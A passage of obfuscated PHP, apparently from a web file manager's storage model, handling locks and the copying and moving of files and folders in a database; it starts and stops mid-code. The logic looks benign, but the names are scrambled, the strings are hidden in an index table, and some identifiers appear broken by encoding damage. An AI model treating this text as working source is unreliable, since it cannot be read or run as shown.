array($ö¢Âô×†[647], $ö¢Âô×†[649]), $¾ÀÁëú); } public function lockMoveStart($Î§«à—) { $ƒ®Ï¬şŸ =& $_SERVER[¤øïŠ‹²]; if (!$this->allowLock()) { return; } $this->_lockCheck($ƒ®Ï¬şŸ[649], $Î§«à—); $œÙÚÌñ = 1; $this->_lockKey($ƒ®Ï¬şŸ[653] . $Î§«à—, $œÙÚÌñ); $this->_lockEvent($Î§«à—, array($ƒ®Ï¬şŸ[647], $ƒ®Ï¬şŸ[648]), $œÙÚÌñ); $this->_lockParent($Î§«à—, array($ƒ®Ï¬şŸ[647], $ƒ®Ï¬şŸ[649]), $œÙÚÌñ); $this->_lockEvent($Î§«à—, array($ƒ®Ï¬şŸ[654], $ƒ®Ï¬şŸ[650], $ƒ®Ï¬şŸ[651]), $œÙÚÌñ); $this->_lockCheckEnd($ƒ®Ï¬şŸ[649], $Î§«à—); } public function lockMoveEnd($†™µê) { $İÑ´¯Õ» =& $_SERVER[¤øïŠ‹²]; if (!$this->allowLock()) { return; } $Î©…°Õğ = 0; $this->_lockKey($İÑ´¯Õ»[653] . $†™µê, $Î©…°Õğ); $this->_lockEvent($†™µê, array($İÑ´¯Õ»[647], $İÑ´¯Õ»[648]), $Î©…°Õğ); $this->_lockParent($†™µê, array($İÑ´¯Õ»[647], $İÑ´¯Õ»[649]), $Î©…°Õğ); $this->_lockEvent($†™µê, array($İÑ´¯Õ»[654], $İÑ´¯Õ»[650], $İÑ´¯Õ»[651]), $Î©…°Õğ); } private function _lockCheck($…”²Œ—, $Êö«Î¯Ğ) { $º©üáûî =& $_SERVER[¤øïŠ‹²]; $ÌÇ°§òš = $this->sourceInfo($Êö«Î¯Ğ); $Ç—œ¶Ø = $…”²Œ— . $º©üáûî[10] . $Êö«Î¯Ğ; $this->_lockTimeStart[$Ç—œ¶Ø] = timeFloat(); if (!is_array($ÌÇ°§òš)) { return; } $Ş£¦Úô¾ = LNG($º©üáûî[655]); CacheLock::setErrorMsg($º©üáûî[186] . htmlspecialchars($ÌÇ°§òš[$º©üáûî[32]]) . $º©üáûî[188] . $Ş£¦Úô¾); $this->_lockKey($Ç—œ¶Ø, 1); $this->_lockKey($Ç—œ¶Ø, 0); $´Çà÷óƒ = array_reverse($this->parentLevelArray($ÌÇ°§òš[$º©üáûî[610]])); foreach ($´Çà÷óƒ as $°òËóÈ) { $Ç—œ¶Ø = $…”²Œ— . $º©üáûî[656] . $°òËóÈ; if (CacheLock::lockGet($º©üáûî[657] . $Ç—œ¶Ø)) { $ÌÇ°§òš = $this->sourceInfo($°òËóÈ); CacheLock::setErrorMsg($º©üáûî[186] . htmlspecialchars($ÌÇ°§òš[$º©üáûî[32]]) . $º©üáûî[188] . $Ş£¦Úô¾); $this->_lockKey($Ç—œ¶Ø, 1); $this->_lockKey($Ç—œ¶Ø, 0); } } } private function _lockCheckEnd($Âˆşë³°, $˜Ìô†Ïß) { $«ê„§À =& $_SERVER[¤øïŠ‹²]; $³÷ö¼†Ø = $Âˆşë³° . $«ê„§À[10] . $˜Ìô†Ïß; CacheLock::setErrorMsg($«ê„§À[63]); if (!isset($this->_lockTimeStart[$³÷ö¼†Ø])) { return; } $¤Ûù®Éˆ = timeFloat() - $this->_lockTimeStart[$³÷ö¼†Ø]; unset($this->_lockTimeStart[$³÷ö¼†Ø]); if ($¤Ûù®Éˆ > 0.5) { unset(self::$cacheSourceInfo[$«ê„§À[553] . $˜Ìô†Ïß]); } $Ÿ°·«¾ã = $this->sourceInfo($˜Ìô†Ïß); if (!$Ÿ°·«¾ã) { show_json(LNG($«ê„§À[117]), !1); } } private function _lockParent($¿üÙù‰º, $Èû’–œª, $ü Êëä£) { if (!$this->autoLockSet) { return; } $ûİÙú² = $this->sourceInfo($¿üÙù‰º); if (!is_array($ûİÙú²)) { return; } $€¡¼•šŸ = array_reverse($this->parentLevelArray($ûİÙú²[$_SERVER[¤øïŠ‹²][610]])); foreach ($€¡¼•šŸ as $Ñ‘–½¥) { $this->_lockEvent($Ñ‘–½¥, $Èû’–œª, $ü Êëä£); } } private function _lockEvent($Äòµİ÷, $ÌÓ¬–¥Ô, $´£³£Õ) { $Ñ®ßÁËØ =& $_SERVER[¤øïŠ‹²]; if (!$this->autoLockSet) { return; } foreach ($ÌÓ¬–¥Ô as $ÍÆÜÂè) { $µûúûö = $ÍÆÜÂè . $Ñ®ßÁËØ[10] . $Äòµİ÷; if ($´£³£Õ && CacheLock::lockGet($Ñ®ßÁËØ[657] . $µûúûö)) { continue; } $this->_lockKey($µûúûö, $´£³£Õ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($œÇü£Â, $ÆËÁä…Ä = 1) { $ñ¢ä’àå = $_SERVER[¤øïŠ‹²][657] . md5($œÇü£Â); if ($ÆËÁä…Ä) { if (isset(self::$_lockItemArr[$ñ¢ä’àå])) { return; } self::$_lockItemArr[$ñ¢ä’àå] = 1; CacheLock::lock($ñ¢ä’àå, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ñ¢ä’àå])) { return; } unset(self::$_lockItemArr[$ñ¢ä’àå]); CacheLock::unlock($ñ¢ä’àå); } } public function isParentOf($Ş¦ßò÷ò, $ğ¹”ÒÍ”) { $ªìğù‚° =& $_SERVER[¤øïŠ‹²]; $À¼”Íü = $this->sourceInfo($Ş¦ßò÷ò); $³ıÇºÖà = $this->sourceInfo($ğ¹”ÒÍ”); $±²™øŒ¨ = $À¼”Íü[$ªìğù‚°[610]] . $À¼”Íü[$ªìğù‚°[204]] . $ªìğù‚°[50]; $ÖÃõĞÃ– = $³ıÇºÖà[$ªìğù‚°[610]] . $³ıÇºÖà[$ªìğù‚°[204]] . $ªìğù‚°[50]; $´¡Ïè®´ = strpos($ÖÃõĞÃ–, $±²™øŒ¨) === 0; return $´¡Ïè®´; } private $targetIsDelete = 0; public function copy($©Çâç¯ş, $‹ÖÒˆ‡€, $ö€‚õ¸¹ = REPEAT_REPLACE, $³é“·­¨ = '') { $“úÚóË =& $_SERVER[¤øïŠ‹²]; $¼“À = $this->sourceInfo($©Çâç¯ş); $¨Òìç‘ˆ = $this->sourceInfo($‹ÖÒˆ‡€); if (!$¼“À || !$¨Òìç‘ˆ || $¨Òìç‘ˆ[$“úÚóË[506]] != $“úÚóË[102]) { return !1; } if ($this->isParentOf($©Çâç¯ş, $‹ÖÒˆ‡€)) { return !1; } $¢¼ÇÇ–Ô = $³é“·­¨ ? $³é“·­¨ : $¼“À[$“úÚóË[32]]; $this->lockCopyStart($©Çâç¯ş); $this->lockWriteStart($‹ÖÒˆ‡€, $¢¼ÇÇ–Ô); $æãöê£ = array($“úÚóË[658] => array(), $“úÚóË[659] => array(), $“úÚóË[660] => array()); $this->targetIsDelete = intval($¼“À[$“úÚóË[526]]); $–’•­ÑÌ = $this->fileNameExistAuto($‹ÖÒˆ‡€, $¼“À); $¸êÏõ‰à = $this->_copy($©Çâç¯ş, $‹ÖÒˆ‡€, $ö€‚õ¸¹, $æãöê£, !0, $³é“·­¨); $this->_childrenListClear(); $this->lockCopyEnd($©Çâç¯ş); $this->lockWriteEnd($‹ÖÒˆ‡€, $¢¼ÇÇ–Ô); if ($¼“À[$“úÚóË[506]] == $“úÚóË[102] && $–’•­ÑÌ == $¸êÏõ‰à) { $this->folderSizeResetChildren($–’•­ÑÌ); } Model($“úÚóË[661])->addAll($æãöê£[$“úÚóË[659]], array(), !0); if ($–’•­ÑÌ != $¸êÏõ‰à || $¼“À[$“úÚóË[506]] == $“úÚóË[102]) { Model($“úÚóË[662])->eventCopy($¸êÏõ‰à); } $this->saveAll($æãöê£[$“úÚóË[660]]); Model($“úÚóË[243])->linkAdd($æãöê£[$“úÚóË[658]]); $this->folderSizeReset($‹ÖÒˆ‡€); $this->updateModifyTime($‹ÖÒˆ‡€); return $¸êÏõ‰à; } private function _copy($í•„¯¯¶, $¯Œ¦ÙÕË, $ˆ Öû, &$ƒ¸Çà«„, $º»ÍåÑ, $Ú€“Äíù = '') { $ÇÚ¥Öú´ =& $_SERVER[¤øïŠ‹²]; $È¡‡ÍÜ = $this->sourceInfoCache($í•„¯¯¶); $“ğ™Ë‘Õ = $È¡‡ÍÜ[$ÇÚ¥Öú´[506]] == $ÇÚ¥Öú´[102]; $Ù¾¯¼•Á = $Ú€“Äíù ? $Ú€“Äíù : $È¡‡ÍÜ[$ÇÚ¥Öú´[32]]; $îÃ·ˆº = $this->fileNameExistAuto($¯Œ¦ÙÕË, $È¡‡ÍÜ); if ($º»ÍåÑ) { $this->_childrenAllMake($í•„¯¯¶); if ($“ğ™Ë‘Õ && $îÃ·ˆº) { $this->_childrenAllMake($îÃ·ˆº); } } if (!$îÃ·ˆº) { return $this->_copyCreate($í•„¯¯¶, $¯Œ¦ÙÕË, $Ù¾¯¼•Á, $ƒ¸Çà«„); } $Ê…éëÆ¶ = $îÃ·ˆº; if ($“ğ™Ë‘Õ) { if ($ˆ Öû == REPEAT_RENAME_FOLDER) { $Ù¾¯¼•Á = $this->fileNameAutoCache($¯Œ¦ÙÕË, $Ù¾¯¼•Á, $ˆ Öû, $“ğ™Ë‘Õ); $Ê…éëÆ¶ = $this->_copyCreate($í•„¯¯¶, $¯Œ¦ÙÕË, $Ù¾¯¼•Á, $ƒ¸Çà«„); } else { $¸ì ã = $this->_childrenList($í•„¯¯¶); foreach ($¸ì ã as $ƒ—íğ‘Ì) { $this->_copy($ƒ—íğ‘Ì[$ÇÚ¥Öú´[204]], $îÃ·ˆº, $ˆ Öû, $ƒ¸Çà«„, !1); } } } else { if ($ˆ Öû == REPEAT_RENAME || $ˆ Öû == REPEAT_RENAME_FOLDER) { $Ù¾¯¼•Á = $this->fileNameAutoCache($¯Œ¦ÙÕË, $Ù¾¯¼•Á, $ˆ Öû, $“ğ™Ë‘Õ); $Ê…éëÆ¶ = $this->_copyCreate($í•„¯¯¶, $¯Œ¦ÙÕË, $Ù¾¯¼•Á, $ƒ¸Çà«„); } else { if ($ˆ Öû == REPEAT_REPLACE) { $æÊØ¢à = $this->sourceInfoCache($îÃ·ˆº); $âÉ¸…¸ = $this->fileHistory($æÊØ¢à, $È¡‡ÍÜ[$ÇÚ¥Öú´[563]], $È¡‡ÍÜ[$ÇÚ¥Öú´[90]]); if ($âÉ¸…¸) { $ƒ¸Çà«„[$ÇÚ¥Öú´[658]][] = $È¡‡ÍÜ[$ÇÚ¥Öú´[563]]; } } else { if ($ˆ Öû == REPEAT_SKIP) { } } } Hook::trigger($ÇÚ¥Öú´[663], array($ÇÚ¥Öú´[664], $È¡‡ÍÜ, 0)); } return $Ê…éëÆ¶; } private function _copyCreate($––¬—¯», $âõçÔç¨, $ƒğÎİì, &$Ù¹£Û¦) { $–Ø”Ú¶Ø =& $_SERVER[¤øïŠ‹²]; $ˆÌ†¾Ó = $this->sourceInfoCache($––¬—¯»); $Ò‡ŠÏÚŠ = $this->sourceInfoCache($âõçÔç¨); $ä“êûü‰ = $this->_makeItemData($ˆÌ†¾Ó, $Ò‡ŠÏÚŠ, $ƒğÎİì); Hook::trigger($–Ø”Ú¶Ø[665], $ä“êûü‰); Hook::trigger($–Ø”Ú¶Ø[666], array($–Ø”Ú¶Ø[667], $ä“êûü‰, 0)); $Æ–ÄÔ›ó = $this->add($ä“êûü‰); $°©Œ¯Ö = array($–Ø”Ú¶Ø[204] => $Æ–ÄÔ›ó, $–Ø”Ú¶Ø[32] => $ƒğÎİì); $this->_copyApplyMeta($°©Œ¯Ö, $Ù¹£Û¦); if ($ˆÌ†¾Ó[$–Ø”Ú¶Ø[506]] != $–Ø”Ú¶Ø[102]) { $Ù¹£Û¦[$–Ø”Ú¶Ø[658]][] = $ˆÌ†¾Ó[$–Ø”Ú¶Ø[563]]; return $Æ–ÄÔ›ó; } $è²ùÚÜğ = array(); $õÈûãÅš = array(); $this->_childrenListAll($––¬—¯», $è²ùÚÜğ); $ãçÊãÖ = count($è²ùÚÜğ); if ($ãçÊãÖ == 0) { return $Æ–ÄÔ›ó; } $ÃÀ’É” = $this->sourceInfo($Æ–ÄÔ›ó); foreach ($è²ùÚÜğ as $ŞŞüÀªÄ) { $šÔÈØÌÊ = $this->_makeItemData($ŞŞüÀªÄ, $ÃÀ’É”, $ŞŞüÀªÄ[$–Ø”Ú¶Ø[32]]); $šÔÈØÌÊ[$–Ø”Ú¶Ø[610]] = $ŞŞüÀªÄ[$–Ø”Ú¶Ø[610]]; $õÈûãÅš[] = $šÔÈØÌÊ; } $this->chunkEventSet($–Ø”Ú¶Ø[668], array($–Ø”Ú¶Ø[669], $ä“êûü‰, $ãçÊãÖ)); $this->addAll($õÈûãÅš, array(), !1); $ÜˆåÑÑû = $this->where(array($–Ø”Ú¶Ø[203] => $Æ–ÄÔ›ó))->select(); $ÆĞ‰¾ÚÈ = $this->_childrenMakeRelation($è²ùÚÜğ, $ÜˆåÑÑû); $ÆĞ‰¾ÚÈ[$––¬—¯»] = $Æ–ÄÔ›ó; $¯ ÄŞş = array(); $éá÷àúÃ = array(); foreach ($ÜˆåÑÑû as $ŞŞüÀªÄ) { $Æ‡š®ö‰ = $ŞŞüÀªÄ[$–Ø”Ú¶Ø[204]]; $ûŞøÚá = $this->_childrenMatch($ÆĞ‰¾ÚÈ, $ŞŞüÀªÄ, $ÃÀ’É”); $¯ ÄŞş[] = array($–Ø”Ú¶Ø[204], $Æ‡š®ö‰, $–Ø”Ú¶Ø[203], $ûŞøÚá[$–Ø”Ú¶Ø[203]]); $éá÷àúÃ[] = array($–Ø”Ú¶Ø[204], $Æ‡š®ö‰, $–Ø”Ú¶Ø[610], $ûŞøÚá[$–Ø”Ú¶Ø[610]]); $this->_copyApplyMeta($ŞŞüÀªÄ, $Ù¹£Û¦); if ($ŞŞüÀªÄ[$–Ø”Ú¶Ø[506]] != $–Ø”Ú¶Ø[102]) { $Ù¹£Û¦[$–Ø”Ú¶Ø[658]][] = $ŞŞüÀªÄ[$–Ø”Ú¶Ø[563]]; } } $this->chunkEventSet($–Ø”Ú¶Ø[670], array($–Ø”Ú¶Ø[671], $ä“êûü‰, $ãçÊãÖ)); $this->saveAll($¯ ÄŞş); $this->chunkEventSet($–Ø”Ú¶Ø[672], array($–Ø”Ú¶Ø[673], $ä“êûü‰, $ãçÊãÖ)); $this->saveAll($éá÷àúÃ); return $Æ–ÄÔ›ó; } private function _childrenMakeRelation($¢ä¸’Æş, $·ˆ×²ç) { $ìïÃÜµ =& $_SERVER[¤øïŠ‹²]; $ôõ–âÊ› = array(); $¥Š€ª³× = array(); foreach ($¢ä¸’Æş as $íõÍŒïÇ) { $è±µ‰‡« = $íõÍŒïÇ[$ìïÃÜµ[32]] . $ìïÃÜµ[8] . $íõÍŒïÇ[$ìïÃÜµ[610]]; $ôõ–âÊ›[$è±µ‰‡«] = $íõÍŒïÇ[$ìïÃÜµ[204]]; } foreach ($·ˆ×²ç as $íõÍŒïÇ) { $è±µ‰‡« = $íõÍŒïÇ[$ìïÃÜµ[32]] . $ìïÃÜµ[8] . $íõÍŒïÇ[$ìïÃÜµ[610]]; $å©è©ÌÀ = $ôõ–âÊ›[$è±µ‰‡«]; $¥Š€ª³×[$å©è©ÌÀ] = $íõÍŒïÇ[$ìïÃÜµ[204]]; } return $¥Š€ª³×; } private function _childrenMatch($“ãª˜ã¹, $ßˆâéæÇ, $×•ËĞ) { $ƒ¼‰ØŞù =& $_SERVER[¤øïŠ‹²]; $‹ÒŞá´Ç = $×•ËĞ[$ƒ¼‰ØŞù[610]]; $¾˜©ëóŞ = $this->parentLevelArray($ßˆâéæÇ[$ƒ¼‰ØŞù[610]]); foreach ($¾˜©ëóŞ as $šÒ®Ë²®) { if (isset($“ãª˜ã¹[$šÒ®Ë²®])) { $‹ÒŞá´Ç .= $“ãª˜ã¹[$šÒ®Ë²®] . $ƒ¼‰ØŞù[674]; } } $‹ÒŞá´Ç = rtrim($‹ÒŞá´Ç, $ƒ¼‰ØŞù[50]) . $ƒ¼‰ØŞù[50]; $óæ±Úó¶ = $this->parentLevelArray($‹ÒŞá´Ç); $òìïãÜû = $óæ±Úó¶[count($óæ±Úó¶) - 1]; return array($ƒ¼‰ØŞù[203] => $òìïãÜû, $ƒ¼‰ØŞù[610] => $‹ÒŞá´Ç); } private function _makeItemData($Í»©óü–, $´Áùçšì, $»Åü‚½‡) { $‚ï÷èíÖ =& $_SERVER[¤øïŠ‹²]; $Îà† = array($‚ï÷èíÖ[675] => $Í»©óü–[$‚ï÷èíÖ[506]], $‚ï÷èíÖ[515] => $»Åü‚½‡, $‚ï÷èíÖ[676] => $Í»©óü–[$‚ï÷èíÖ[507]] ? $Í»©óü–[$‚ï÷èíÖ[507]] : $‚ï÷èíÖ[12], $‚ï÷èíÖ[564] => $Í»©óü–[$‚ï÷èíÖ[563]] ? $Í»©óü–[$‚ï÷èíÖ[563]] : 0, $‚ï÷èíÖ[646] => $Í»©óü–[$‚ï÷èíÖ[90]] ? $Í»©óü–[$‚ï÷èíÖ[90]] : 0, $‚ï÷èíÖ[677] => intval($´Áùçšì[$‚ï÷èíÖ[201]]), $‚ï÷èíÖ[678] => intval($´Áùçšì[$‚ï÷èíÖ[595]]), $‚ï÷èíÖ[679] => intval(USER_ID), $‚ï÷èíÖ[680] => intval(USER_ID), $‚ï÷èíÖ[498] => intval($´Áùçšì[$‚ï÷èíÖ[204]]), $‚ï÷èíÖ[681] => $´Áùçšì[$‚ï÷èíÖ[610]] . $´Áùçšì[$‚ï÷èíÖ[204]] . $‚ï÷èíÖ[50], $‚ï÷èíÖ[519] => $Í»©óü–[$‚ï÷èíÖ[99]] ? $Í»©óü–[$‚ï÷èíÖ[99]] : time(), $‚ï÷èíÖ[525] => 0, $‚ï÷èíÖ[682] => $‚ï÷èíÖ[12]); return $Îà†; } private function _copyApplyMeta($Ò–¨¸è¬, &$¶Àş¶”) { $Íâ’êÅ =& $_SERVER[¤øïŠ‹²]; $—â“âäå = $Ò–¨¸è¬[$Íâ’êÅ[204]]; $ñ››øÛ = $Ò–¨¸è¬[$Íâ’êÅ[32]]; if (!isset($Ò–¨¸è¬[$Íâ’êÅ[683]]) || !$Ò–¨¸è¬[$Íâ’êÅ[683]] || $Ò–¨¸è¬[$Íâ’êÅ[683]] == $Íâ’êÅ[241]) { $¶Àş¶”[$Íâ’êÅ[660]][] = array($Íâ’êÅ[204], $—â“âäå, $Íâ’êÅ[683], short_id($—â“âäå)); } if (Input::check($ñ››øÛ, $Íâ’êÅ[684])) { $¶Àş¶”[$Íâ’êÅ[659]][] = array($Íâ’êÅ[204] => $—â“âäå, $Íâ’êÅ[106] => $Íâ’êÅ[558], $Íâ’êÅ[462] => str_replace($Íâ’êÅ[53], $Íâ’êÅ[12], Pinyin::get($ñ››øÛ))); $¶Àş¶”[$Íâ’êÅ[659]][] = array($Íâ’êÅ[204] => $—â“âäå, $Íâ’êÅ[106] => $Íâ’êÅ[557], $Íâ’êÅ[462] => Pinyin::get($ñ››øÛ, $Íâ’êÅ[685])); } $¶Àş¶”[$Íâ’êÅ[659]][] = array($Íâ’êÅ[204] => $—â“âäå, $Íâ’êÅ[106] => $Íâ’êÅ[537], $Íâ’êÅ[462] => KodSort::makeStr($ñ››øÛ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ğ±ºæáÕ) { $ÑÊ±¥Øî =& $_SERVER[¤øïŠ‹²]; $£ùÁÛ  = $this->sourceInfo($ğ±ºæáÕ); $ó•Úúİ = $ÑÊ±¥Øî[686]; $Ì‹—ˆš‡ = array($ÑÊ±¥Øî[610] => array($ÑÊ±¥Øî[641], $£ùÁÛ [$ÑÊ±¥Øî[610]] . $ğ±ºæáÕ . $ÑÊ±¥Øî[642]), $ÑÊ±¥Øî[526] => $this->targetIsDelete); $½âˆ¡¥ = $this->field($ó•Úúİ)->where($Ì‹—ˆš‡)->select(); if (!$½âˆ¡¥) { return; } $½âˆ¡¥ = array_to_keyvalue($½âˆ¡¥, $ÑÊ±¥Øî[204]); foreach ($½âˆ¡¥ as $†û‰ÓÎô) { $ùƒÈÔ­¾ = $†û‰ÓÎô[$ÑÊ±¥Øî[203]]; $ğ±ºæáÕ = $†û‰ÓÎô[$ÑÊ±¥Øî[204]]; if (!isset($this->_childrenListCache[$ğ±ºæáÕ]) && $†û‰ÓÎô[$ÑÊ±¥Øî[506]] == $ÑÊ±¥Øî[102]) { $this->_childrenListCache[$ğ±ºæáÕ] = array(); } if (!isset($this->_childrenListCache[$ùƒÈÔ­¾])) { $this->_childrenListCache[$ùƒÈÔ­¾] = array(); } $this->_childrenListCache[$ùƒÈÔ­¾][$ğ±ºæáÕ] = $†û‰ÓÎô; $this->_childrenItemCache[$ğ±ºæáÕ] = $†û‰ÓÎô; } } private function _childrenListAll($¬„ø¤Òˆ, &$§’¤İØ²) { $ë ¿ÊË =& $_SERVER[¤øïŠ‹²]; if (!isset($this->_childrenListCache[$¬„ø¤Òˆ])) { return; } $øâÜ…Û‡ = $this->_childrenListCache[$¬„ø¤Òˆ]; foreach ($øâÜ…Û‡ as $ÂÓ‰œ± => $ìóÏ¾İ) { $§’¤İØ²[$ÂÓ‰œ±] = $ìóÏ¾İ; if ($ìóÏ¾İ[$ë ¿ÊË[506]] == $ë ¿ÊË[102]) { $this->_childrenListAll($ÂÓ‰œ±, $§’¤İØ²); } } } private function sourceInfoCache($Ëè¬ïÃû) { if (isset($this->_childrenItemCache[$Ëè¬ïÃû])) { return $this->_childrenItemCache[$Ëè¬ïÃû]; } return $this->sourceInfo($Ëè¬ïÃû); } private function _childrenList($¶¼­ÈÎé) { if (isset($this->_childrenListCache[$¶¼­ÈÎé])) { return $this->_childrenListCache[$¶¼­ÈÎé]; } return $this->_childrenListSelect($¶¼­ÈÎé); } private function _childrenListSelect($¶çøÍ¡²) { $Š×§ñ†ö =& $_SERVER[¤øïŠ‹²]; $§É£•ºÜ = array($Š×§ñ†ö[203] => $¶çøÍ¡², $Š×§ñ†ö[526] => $this->targetIsDelete); $›ŠùÍ‹¢ = $this->where($§É£•ºÜ)->select(); $›ŠùÍ‹¢ = $›ŠùÍ‹¢ ? $›ŠùÍ‹¢ : array(); $æªçõÌÔ = array_to_keyvalue($›ŠùÍ‹¢, $Š×§ñ†ö[204]); $this->_childrenListCache[$¶çøÍ¡²] = $æªçõÌÔ; foreach ($æªçõÌÔ as $¶çøÍ¡² => $ËŠäÛßŒ) { $this->_childrenItemCache[$¶çøÍ¡²] = $ËŠäÛßŒ; } return $æªçõÌÔ; } private function fileNameExistAuto($ß³Èİ®, $Ğ«¬Æéß) { $Š“­Üæì =& $_SERVER[¤øïŠ‹²]; if ($Ğ«¬Æéß[$Š“­Üæì[526]] == $Š“­Üæì[102]) { return $this->fileNameExist($ß³Èİ®, $Ğ«¬Æéß[$Š“­Üæì[32]]); } return $this->fileNameExistCache($ß³Èİ®, $Ğ«¬Æéß[$Š“­Üæì[32]]); } private function fileNameExistCache($¿®ÁÄìß, $ÚŒ®Ü‰¦) { $‰ø§µöú =& $_SERVER[¤øïŠ‹²]; $ÚŒ®Ü‰¦ = strtolower($ÚŒ®Ü‰¦); $„ÙË‡—· = $this->_childrenList($¿®ÁÄìß); foreach ($„ÙË‡—· as $÷ÜËÊ) { if ($ÚŒ®Ü‰¦ == strtolower($÷ÜËÊ[$‰ø§µöú[32]])) { return $÷ÜËÊ[$‰ø§µöú[204]]; } } return !1; } private function fileNameAutoCache($ÑéÆÚ¼Í, $Ê©ÅÁ‘±, $Øâë Ğª, $”Úë¶Ó) { $‘•“Îê =& $_SERVER[¤øïŠ‹²]; $ºî„˜Ú® = $this->_childrenList($ÑéÆÚ¼Í); $›¿’ÁÌ¹ = array_to_keyvalue($ºî„˜Ú®, $‘•“Îê[12], $‘•“Îê[32]); return $this->fileNameAutoGet($›¿’ÁÌ¹, $Ê©ÅÁ‘±, $Øâë Ğª, $”Úë¶Ó); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($„½Í¤«², $æÁ…È‘½, $ù×»½ºİ = REPEAT_REPLACE, $ó×ÁÃƒÔ = '') { $Œ¨£‡ù“ =& $_SERVER[¤øïŠ‹²]; $éùï›ø = $this->sourceInfo($„½Í¤«²); $˜Ú»£Ö¿ = $this->sourceInfo($æÁ…È‘½); if ($éùï›ø[$Œ¨£‡ù“[203]] == $˜Ú»£Ö¿[$Œ¨£‡ù“[204]]) { if ($éùï›ø[$Œ¨£‡ù“[526]] == $Œ¨£‡ù“[102]) { Model($Œ¨£‡ù“[524])->restore(array($„½Í¤«²)); } if (!$ó×ÁÃƒÔ || $ó×ÁÃƒÔ == $éùï›ø[$Œ¨£‡ù“[32]]) { return $„½Í¤«²; } } $Ü’ÚÂ÷ş = $this->pathInfoMore($„½Í¤«²); if ($this->isParentOf($„½Í¤«², $æÁ…È‘½)) { return !1; } if (!$éùï›ø || !$˜Ú»£Ö¿ || $˜Ú»£Ö¿[$Œ¨£‡ù“[506]] != $Œ¨£‡ù“[102]) { return !1; } Hook::trigger($Œ¨£‡ù“[687], $Ü’ÚÂ÷ş); $this->targetIsDelete = intval($éùï›ø[$Œ¨£‡ù“[526]]); if ($éùï›ø[$Œ¨£‡ù“[203]] == $æÁ…È‘½ && $ó×ÁÃƒÔ != $éùï›ø[$Œ¨£‡ù“[32]]) { $ŸÃ™¼¥˜ = $this->fileNameExist($æÁ…È‘½, $ó×ÁÃƒÔ); if ($ŸÃ™¼¥˜ && $éùï›ø[$Œ¨£‡ù“[506]] == $Œ¨£‡ù“[241]) { $ØÖ‡¾ú¡ = $this->sourceInfo($ŸÃ™¼¥˜); $¡û­•ÒÑ = $this->fileHistory($ØÖ‡¾ú¡, $éùï›ø[$Œ¨£‡ù“[563]], $éùï›ø[$Œ¨£‡ù“[90]]); if (!$¡û­•ÒÑ) { Model($Œ¨£‡ù“[566])->remove($éùï›ø[$Œ¨£‡ù“[563]]); } $this->removeNow($„½Í¤«², !1); $this->folderSizeReset($æÁ…È‘½); Hook::trigger($Œ¨£‡ù“[688], $Ü’ÚÂ÷ş); return $ŸÃ™¼¥˜; } } $Ğ’«‘¹ = $ó×ÁÃƒÔ ? $ó×ÁÃƒÔ : $éùï›ø[$Œ¨£‡ù“[32]]; $this->lockMoveStart($„½Í¤«²); $this->lockWriteStart($æÁ…È‘½, $Ğ’«‘¹); $†Ô–›ğ­ = array($Œ¨£‡ù“[658] => array(), $Œ¨£‡ù“[689] => !1); $this->clearShare($„½Í¤«², $æÁ…È‘½); $ä ‡ñØ¾ = $this->fileNameExistAuto($æÁ…È‘½, $éùï›ø); $ŸÙ…«ŒŠ = $this->_move($„½Í¤«², $æÁ…È‘½, $ù×»½ºİ, $†Ô–›ğ­, $ó×ÁÃƒÔ); $this->sourceCacheClear(); if ($éùï›ø[$Œ¨£‡ù“[506]] == $Œ¨£‡ù“[102] && $ä ‡ñØ¾) { $this->folderSizeResetChildren($ŸÙ…«ŒŠ); } Model($Œ¨£‡ù“[243])->linkAdd($†Ô–›ğ­[$Œ¨£‡ù“[658]]); if ($ŸÙ…«ŒŠ && $ä ‡ñØ¾ && $†Ô–›ğ­[$Œ¨£‡ù“[689]]) { $™°®è = $éùï›ø[$Œ¨£‡ù“[506]] == $Œ¨£‡ù“[102] ? $this->_childrenListSelect($„½Í¤«²) : !1; $›œ™šÇ— = $™°®è && count($™°®è) > 0 ? !0 : !1; $this->removeNow($„½Í¤«², $›œ™šÇ—); } $this->lockMoveEnd($„½Í¤«²); $this->lockWriteEnd($æÁ…È‘½, $Ğ’«‘¹); $this->folderSizeReset($éùï›ø[$Œ¨£‡ù“[203]]); $this->folderSizeReset($æÁ…È‘½); $¾‚à°şá = array($éùï›ø[$Œ¨£‡ù“[203]], $æÁ…È‘½); if ($éùï›ø[$Œ¨£‡ù“[506]] == $Œ¨£‡ù“[102]) { $¾‚à°şá[] = $„½Í¤«²; } $this->updateModifyTime($¾‚à°şá); Model($Œ¨£‡ù“[662])->eventMove($„½Í¤«², $éùï›ø[$Œ¨£‡ù“[203]], $æÁ…È‘½); Hook::trigger($Œ¨£‡ù“[688], $Ü’ÚÂ÷ş); return $ŸÙ…«ŒŠ; } private function _move($âèû¦¶”, $òø–û‹ß, $ûØ¯ô—Ğ, &$ÈŸ¿ß÷, $ë àÓÔ = '') { $ Îó¬¥ =& $_SERVER[¤øïŠ‹²]; $”€Êü© = $this->sourceInfo($âèû¦¶”); $ŞàçÄ«¡ = $”€Êü©[$ Îó¬¥[506]] == $ Îó¬¥[102]; $ é¢§ƒ¸ = $ë àÓÔ ? $ë àÓÔ : $”€Êü©[$ Îó¬¥[32]]; $½—ÍèÑÕ = $this->fileNameExistAuto($òø–û‹ß, $”€Êü©); $this->lockMoveStart($âèû¦¶”); $this->lockWriteStart($òø–û‹ß, $ é¢§ƒ¸); if (!$½—ÍèÑÕ) { return $this->_moveForce($âèû¦¶”, $òø–û‹ß, $ é¢§ƒ¸); } $øæäÊ = $½—ÍèÑÕ; $·°ÄËá = !1; if ($ŞàçÄ«¡) { if ($ûØ¯ô—Ğ == REPEAT_RENAME_FOLDER) { $ é¢§ƒ¸ = $this->fileNameAuto($òø–û‹ß, $ é¢§ƒ¸, $ûØ¯ô—Ğ, $ŞàçÄ«¡); $øæäÊ = $this->_moveForce($âèû¦¶”, $òø–û‹ß, $ é¢§ƒ¸); } else { $Ç½çú = $this->_childrenListSelect($âèû¦¶”); foreach ($Ç½çú as $í‰¾‡¾ı) { $Ç•ıËÉ’ = REPEAT_REPLACE; $this->_move($í‰¾‡¾ı[$ Îó¬¥[204]], $½—ÍèÑÕ, $Ç•ıËÉ’, $ÈŸ¿ß÷); } 